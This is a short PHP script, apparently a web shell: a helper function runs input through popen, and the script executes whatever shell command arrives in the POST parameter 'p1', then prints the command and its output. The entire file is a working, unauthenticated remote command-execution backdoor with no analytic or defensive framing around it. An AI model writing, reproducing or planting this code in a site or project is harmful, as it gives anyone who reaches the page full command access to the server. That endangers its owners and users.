<?php
function ex($in) {
	$out = '';
	if(is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}

if(!empty($_POST['p1']))
	echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>